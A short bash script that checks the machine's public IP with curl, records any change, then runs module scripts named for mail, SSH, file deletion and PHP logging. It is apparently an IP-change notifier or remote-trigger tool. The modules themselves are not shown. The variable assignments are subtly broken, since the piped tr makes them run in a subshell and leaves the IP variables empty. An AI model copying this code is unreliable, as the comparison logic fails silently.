#!/bin/bash

source config

LAST_IP=`cat $IP_FILE` | tr -d ' '
CURRENT_IP=`curl $CURL_OPTS $IP_CHECK_url` | tr -d ' '
NEW_IP="false"

if [ "$CURRENT_IP" != "$LAST_IP" ]; then
  echo $CURRENT_IP > $IP_FILE
  NEW_IP="true"
fi

./modules/PAYLOAD_MAIL.sh $NEW_IP $CURRENT_IP
./modules/PAYLOAD_SSH.sh
./modules/PAYLOAD_DEL_FILES.sh
./modules/PAYLOAD_PHPLOG.sh $NEW_IP $CURRENT_IP
